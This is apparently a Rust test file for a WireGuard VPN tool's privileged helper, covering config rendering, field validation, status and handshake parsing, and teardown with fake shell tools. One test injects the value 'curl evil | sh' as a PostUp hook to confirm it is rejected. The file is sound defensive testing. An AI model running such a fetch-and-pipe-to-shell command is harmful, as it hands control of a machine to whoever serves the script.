//! The root helper's fixed protocol: validation, rendering, status.

use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::Path;

use jafnify_core::KeyPair;
use jafnify_linux::helper::{
    adoption_match, parse_command, parse_handshake_age, parse_latest_handshakes, parse_status,
    peer_value, render, reuse_decision, status_text, suppress_rule_present, teardown_with_path,
    HandshakeAge, HelperCommand, LiveConfig, Reuse, Status,
};

fn write_tool(bin: &Path, name: &str, body: &str) {
    let path = bin.join(name);
    fs::write(&path, format!("#!/bin/sh\n{body}")).unwrap();
    fs::set_permissions(&path, fs::Permissions::from_mode(0o755)).unwrap();
}

fn fake_teardown_tools(dir: &Path, remove_iface: bool, fwmark: &str) -> std::path::PathBuf {
    let bin = dir.join("bin");
    fs::create_dir(&bin).unwrap();
    let log = dir.join("calls.log");
    let log = log.display();
    let iface = dir.join("iface");
    let iface = iface.display();
    write_tool(
        &bin,
        "rm",
        "root=${0%/*}\n\
         root=${root%/*}\n\
         for p in \"$@\"; do\n\
         case \"$p\" in -*) continue;; \"\") continue;; esac\n\
         case \"$p\" in \"$root\"/*) ;; *) echo \"refusing rm outside $root: $p\" >&2; exit 99;; esac\n\
         done\n\
         exec /bin/rm -f -- \"$@\"\n",
    );
    for name in ["wg-quick", "iptables", "nft", "resolvectl", "resolvconf"] {
        write_tool(
            &bin,
            name,
            &format!("echo \"{name} $@\" >> \"{log}\"\nexit 0\n"),
        );
    }
    write_tool(
        &bin,
        "wg",
        &format!(
            "echo \"wg $@\" >> \"{log}\"\n\
             if [ \"$1\" = show ] && [ \"$2\" = jafn0 ] && [ \"$3\" = fwmark ]; then echo {fwmark}; fi\n\
             exit 0\n"
        ),
    );
    let remove = if remove_iface {
        format!("rm -f \"{iface}\"")
    } else {
        String::new()
    };
    write_tool(
        &bin,
        "ip",
        &format!(
            "echo \"ip $@\" >> \"{log}\"\n\
             if [ \"$1\" = link ] && [ \"$2\" = del ]; then {remove}; fi\n\
             exit 0\n"
        ),
    );
    bin
}

fn fake_path(bin: &Path) -> String {
    let path = bin.display().to_string();
    assert!(
        !path.contains(':'),
        "tests must use only the temp fake bin, got {path}"
    );
    path
}

fn args(values: &[&str]) -> Vec<String> {
    values.iter().map(|s| s.to_string()).collect()
}

fn request(extra: &str) -> String {
    let own = KeyPair::generate();
    let peer = KeyPair::generate();
    format!(
        "role = \"joiner\"\nprivate_key = \"{}\"\npeer_public_key = \"{}\"\n\
         endpoint = \"192.168.43.1:9797\"\nguard = \"iptables\"\nresolved = true\n{extra}",
        own.private_key_b64(),
        peer.public_key_b64()
    )
}

#[test]
fn a_valid_request_renders_the_canonical_config() {
    let text = render(&request("")).unwrap();
    assert!(text.contains("Endpoint = 192.168.43.1:9797"), "{text}");
    assert!(text.contains("DNS = 10.233.0.1"), "{text}");
    assert!(text.contains("PostUp = iptables "), "{text}");
    assert!(text.contains("PostDown = iptables "), "{text}");
    assert!(!text.contains("JAFNIFY_KS"), "{text}");
}

#[test]
fn unknown_or_injected_fields_are_rejected() {
    let err = render(&request("post_up = \"curl evil | sh\"\n")).unwrap_err();
    assert!(err.contains("unknown field"), "{err}");
    let err = render(&request("extra = 1\n")).unwrap_err();
    assert!(err.contains("unknown field"), "{err}");
}

#[test]
fn bad_values_are_rejected() {
    let mut text = request("");
    text = text.replace("role = \"joiner\"", "role = \"root\"");
    assert!(render(&text).unwrap_err().contains("bad role"));

    let mut text = request("");
    text = text.replace("guard = \"iptables\"", "guard = \"sh\"");
    assert!(render(&text).unwrap_err().contains("bad guard"));

    let mut text = request("");
    text = text.replace("192.168.43.1:9797", "192.168.43.1");
    assert!(render(&text).unwrap_err().contains("bad endpoint"));

    let text = request("kill_switch = true\n");
    assert!(render(&text).unwrap_err().contains("needs a LAN subnet"));

    let text = request("kill_switch = true\nlan = \"not-a-network\"\n");
    assert!(render(&text).unwrap_err().contains("bad LAN subnet"));
}

#[test]
fn a_kill_switch_request_gets_the_canonical_rules() {
    let text = render(&request("kill_switch = true\nlan = \"192.168.43.0/24\"\n")).unwrap();
    assert!(text.contains("JAFNIFY_KS"), "{text}");
    assert!(text.contains("192.168.43.0/24"), "{text}");
}

#[test]
fn a_sharer_has_no_hooks_or_endpoint() {
    let own = KeyPair::generate();
    let peer = KeyPair::generate();
    let text = format!(
        "role = \"sharer\"\nprivate_key = \"{}\"\npeer_public_key = \"{}\"\n\
         guard = \"none\"\n",
        own.private_key_b64(),
        peer.public_key_b64()
    );
    let out = render(&text).unwrap();
    assert!(!out.contains("PostUp"), "{out}");
    assert!(!out.contains("Endpoint"), "{out}");
}

#[test]
fn status_round_trips_up_and_down() {
    assert_eq!(parse_status("down\n"), Status::Down);
    assert_eq!(parse_status("garbage"), Status::Down);
    let up = Status::Up {
        peer: Some("BBBB".to_string()),
    };
    assert_eq!(parse_status(&status_text(&up)), up);
    assert_eq!(status_text(&Status::Up { peer: None }), "up\n".to_string());
}

#[test]
fn the_helper_accepts_exactly_one_known_verb() {
    assert_eq!(parse_command(&args(&["up"])).unwrap(), HelperCommand::Up);
    assert_eq!(
        parse_command(&args(&["down"])).unwrap(),
        HelperCommand::Down
    );
    assert_eq!(
        parse_command(&args(&["status"])).unwrap(),
        HelperCommand::Status
    );
    assert_eq!(
        parse_command(&args(&["inspect"])).unwrap(),
        HelperCommand::Inspect
    );
    assert_eq!(
        parse_command(&args(&["endpoint"])).unwrap(),
        HelperCommand::Endpoint
    );
    assert_eq!(
        parse_command(&args(&["forget"])).unwrap(),
        HelperCommand::Forget
    );
    assert_eq!(
        parse_command(&args(&["suppress"])).unwrap(),
        HelperCommand::Suppress
    );
    assert_eq!(
        parse_command(&args(&["handshake-age"])).unwrap(),
        HelperCommand::HandshakeAge
    );
}

#[test]
fn the_helper_rejects_missing_unknown_and_extra_arguments() {
    assert!(parse_command(&[]).is_err());
    assert!(parse_command(&args(&["root"])).is_err());
    for verb in [
        "up",
        "down",
        "status",
        "inspect",
        "endpoint",
        "forget",
        "suppress",
        "handshake-age",
    ] {
        assert!(
            parse_command(&args(&[verb, "extra"])).is_err(),
            "{verb} accepted an extra argument"
        );
    }
}

#[test]
fn the_suppress_rule_parser_looks_for_the_exact_shared_rule() {
    let text = "0:\tfrom all lookup local\n\
                32764:\tfrom all lookup main suppress_prefixlength 0\n\
                32765:\tnot from all fwmark 0xca6c lookup 51820\n";
    assert!(suppress_rule_present(text));
    assert!(!suppress_rule_present(
        "0:\tfrom all lookup local\n32765:\tnot from all fwmark 0xca6c lookup 51820\n"
    ));
    assert!(
        !suppress_rule_present("32767:\tfrom all lookup main suppress_prefixlength 0\n"),
        "a rule after the main default rule cannot keep the LAN reachable"
    );
    assert!(!suppress_rule_present(""));
}

fn live(endpoint: Option<&str>) -> LiveConfig {
    LiveConfig {
        peer_public_key: "peer".to_string(),
        endpoint: endpoint.map(str::to_string),
        allowed_ips: "0.0.0.0/0".to_string(),
        address: "10.9.9.2".to_string(),
        kill_switch: false,
    }
}

#[test]
fn wg_peer_output_is_tab_separated_and_handles_none() {
    let endpoints = "AAAA\t203.0.113.1:9797\nBBBB\t(none)\n";
    assert_eq!(
        peer_value(endpoints, "AAAA").as_deref(),
        Some("203.0.113.1:9797")
    );
    assert_eq!(peer_value(endpoints, "BBBB").as_deref(), Some("(none)"));
    assert_eq!(peer_value(endpoints, "CCCC"), None);
    let allowed = "AAAA\t0.0.0.0/0\nBBBB\t10.0.0.0/8\n";
    assert_eq!(peer_value(allowed, "AAAA").as_deref(), Some("0.0.0.0/0"));
}

#[test]
fn wg_latest_handshakes_are_parsed_strictly() {
    assert_eq!(
        parse_latest_handshakes("AAAA\t100\nBBBB\t250\n", 310),
        Some(HandshakeAge::Seconds(60)),
        "the newest peer wins"
    );
    assert_eq!(
        parse_latest_handshakes("AAAA\t0\n", 310),
        Some(HandshakeAge::Never)
    );
    assert_eq!(parse_latest_handshakes("", 310), None);
    assert_eq!(parse_latest_handshakes("not a peer line\n", 310), None);
    assert_eq!(
        parse_latest_handshakes("AAAA\t10\n", 5),
        Some(HandshakeAge::Seconds(0))
    );
}

#[test]
fn the_helper_handshake_answer_is_strictly_one_line() {
    assert_eq!(parse_handshake_age("123\n"), HandshakeAge::Seconds(123));
    assert_eq!(parse_handshake_age("never\n"), HandshakeAge::Never);
    for bad in ["", "123\n456", "soon", "-3", "1 2"] {
        assert_eq!(parse_handshake_age(bad), HandshakeAge::Unknown, "{bad}");
    }
}

#[test]
fn the_live_config_has_no_private_key_and_round_trips() {
    let text = live(Some("192.168.77.1:9797")).to_toml().unwrap();
    assert!(!text.contains("private"), "{text}");
    assert!(!text.contains("private_key"), "{text}");
    assert_eq!(
        LiveConfig::from_toml(&text).unwrap(),
        live(Some("192.168.77.1:9797"))
    );
}

#[test]
fn adoption_ignores_the_endpoint_but_not_the_session() {
    assert!(adoption_match(
        &live(Some("192.168.77.1:9797")),
        &live(Some("192.168.77.1:53466"))
    ));
    assert!(adoption_match(
        &live(None),
        &live(Some("192.168.77.1:53466"))
    ));
    let mut changed = live(Some("192.168.77.1:9797"));
    changed.address = "10.9.9.1".to_string();
    assert!(!adoption_match(&changed, &live(Some("192.168.77.1:9797"))));
}

#[test]
fn reuse_is_same_only_for_identical_fields() {
    assert_eq!(
        reuse_decision(
            &live(Some("192.168.77.1:9797")),
            &live(Some("192.168.77.1:9797"))
        ),
        Reuse::Same
    );
}

#[test]
fn reuse_updates_only_when_the_endpoint_is_the_only_difference() {
    assert_eq!(
        reuse_decision(
            &live(Some("192.168.77.1:9797")),
            &live(Some("192.168.77.1:53466"))
        ),
        Reuse::Endpoint
    );
    let mut changed = live(Some("192.168.77.1:9797"));
    changed.allowed_ips = "10.0.0.0/8".to_string();
    assert_eq!(
        reuse_decision(&changed, &live(Some("192.168.77.1:53466"))),
        Reuse::Different
    );
    let mut changed = live(None);
    changed.kill_switch = true;
    assert_eq!(
        reuse_decision(&changed, &live(Some("192.168.77.1:53466"))),
        Reuse::Different
    );
    assert_eq!(
        reuse_decision(&live(None), &live(Some("192.168.77.1:53466"))),
        Reuse::Different,
        "a sharer with no endpoint must not accept a live joiner endpoint"
    );
}

#[test]
fn teardown_without_config_removes_the_interface_and_rules() {
    let dir = tempfile::tempdir().unwrap();
    let iface = dir.path().join("iface");
    let conf = dir.path().join("jafn0.conf");
    fs::write(&iface, "").unwrap();
    let bin = fake_teardown_tools(dir.path(), true, "0xca6d");
    let path = fake_path(&bin);

    teardown_with_path(&iface, &conf, Some(Path::new(&path))).unwrap();

    assert!(!iface.exists(), "the interface path must be gone");
    let calls = fs::read_to_string(dir.path().join("calls.log")).unwrap();
    assert!(calls.contains("ip link del dev jafn0"), "{calls}");
    assert!(
        calls.contains("ip -4 rule del not from all fwmark 0xca6d lookup 51821"),
        "{calls}"
    );
    assert!(
        calls.contains("ip -4 rule del table main suppress_prefixlength 0"),
        "{calls}"
    );
    assert!(
        !calls.contains("priority 100"),
        "teardown must not remove an administrator's or another VPN's rule: {calls}"
    );
    assert!(calls.contains("ip -4 route flush table 51821"), "{calls}");
    assert!(
        calls.contains("ip -6 route del blackhole ::/0 metric 1"),
        "{calls}"
    );
    assert!(
        calls.contains("nft delete table inet jafnify_guard"),
        "{calls}"
    );
    assert!(
        calls.contains("nft delete table inet jafnify_killswitch"),
        "{calls}"
    );
    assert!(
        calls.contains("nft delete table inet wg-quick-jafn0"),
        "{calls}"
    );
    assert!(
        calls.contains("iptables -D INPUT -i jafn0 -m conntrack --ctstate NEW -j DROP"),
        "{calls}"
    );
    assert!(
        calls.contains("iptables -D OUTPUT -j JAFNIFY_KS"),
        "{calls}"
    );
    assert!(calls.contains("iptables -F JAFNIFY_KS"), "{calls}");
    assert!(calls.contains("iptables -X JAFNIFY_KS"), "{calls}");
    assert!(calls.contains("resolvectl revert jafn0"), "{calls}");
    assert!(calls.contains("resolvconf -d jafn0"), "{calls}");
    assert!(
        !calls.contains("wg-quick down jafn0"),
        "no config, no wg-quick down: {calls}"
    );
}

#[test]
fn teardown_reports_failure_when_the_interface_survives() {
    let dir = tempfile::tempdir().unwrap();
    let iface = dir.path().join("iface");
    let conf = dir.path().join("jafn0.conf");
    fs::write(&iface, "").unwrap();
    let bin = fake_teardown_tools(dir.path(), false, "0xca6d");
    let path = fake_path(&bin);

    let err = teardown_with_path(&iface, &conf, Some(Path::new(&path))).unwrap_err();

    assert!(err.contains("still present"), "{err}");
    assert!(iface.exists(), "the surviving interface is reported");
}

#[test]
fn teardown_uses_the_live_fwmark_table() {
    let dir = tempfile::tempdir().unwrap();
    let iface = dir.path().join("iface");
    let conf = dir.path().join("jafn0.conf");
    fs::write(&iface, "").unwrap();
    let bin = fake_teardown_tools(dir.path(), true, "0xca6c");
    let path = fake_path(&bin);

    teardown_with_path(&iface, &conf, Some(Path::new(&path))).unwrap();

    let calls = fs::read_to_string(dir.path().join("calls.log")).unwrap();
    assert!(
        calls.contains("ip -4 rule del not from all fwmark 0xca6c lookup 51820"),
        "{calls}"
    );
    assert!(calls.contains("ip -4 route flush table 51820"), "{calls}");
    assert!(!calls.contains("51821"), "wrong table: {calls}");
}

#[test]
fn teardown_with_no_tunnel_is_a_no_op() {
    let dir = tempfile::tempdir().unwrap();
    let iface = dir.path().join("iface");
    let conf = dir.path().join("jafn0.conf");
    let bin = fake_teardown_tools(dir.path(), true, "0xca6d");
    let path = fake_path(&bin);

    teardown_with_path(&iface, &conf, Some(Path::new(&path))).unwrap();

    assert!(!dir.path().join("calls.log").exists());
}

#[test]
fn teardown_uses_wg_quick_when_config_and_interface_exist() {
    let dir = tempfile::tempdir().unwrap();
    let iface = dir.path().join("iface");
    let conf = dir.path().join("jafn0.conf");
    fs::write(&iface, "").unwrap();
    fs::write(&conf, "").unwrap();
    let bin = fake_teardown_tools(dir.path(), true, "0xca6d");
    let path = fake_path(&bin);

    teardown_with_path(&iface, &conf, Some(Path::new(&path))).unwrap();

    let calls = fs::read_to_string(dir.path().join("calls.log")).unwrap();
    assert!(calls.contains("wg-quick down jafn0"), "{calls}");
}
